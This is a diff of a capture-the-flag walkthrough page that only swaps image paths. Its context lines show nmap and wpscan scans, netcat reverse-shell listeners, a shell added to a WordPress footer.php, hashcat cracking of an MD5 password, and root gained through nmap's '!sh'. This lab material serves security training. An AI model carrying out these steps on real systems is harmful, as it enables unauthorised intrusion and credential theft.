@@ -14,7 +14,7 @@
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -127,7 +127,7 @@ nc -lvnp 443
 
 Connection is made but it isn't stable.
 
-<figure><img src="../../.gitbook/assets/image (5) (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -141,7 +141,7 @@ wpscan found out that twentyfifeen is installed.
 wpscan --url http://$VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -151,7 +151,7 @@ nc -vlnp 443
 
 Added the same shell to footer.php which should appear on every page visited. Then I just went back to http://$VICTIM/join and it worked.
 
-<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -175,7 +175,7 @@ ls
 cat password.raw-md5 
 ```
 
-<figure><img src="../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -184,7 +184,7 @@ hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt
 hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt --show
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -193,7 +193,7 @@ su robot
 Password: abcdefghijklmnopqrstuvwxyz
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
 ### LinPeas
 
@@ -213,7 +213,7 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (37) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -224,6 +224,6 @@ chmod +x linpeas.sh
 nmap> !sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
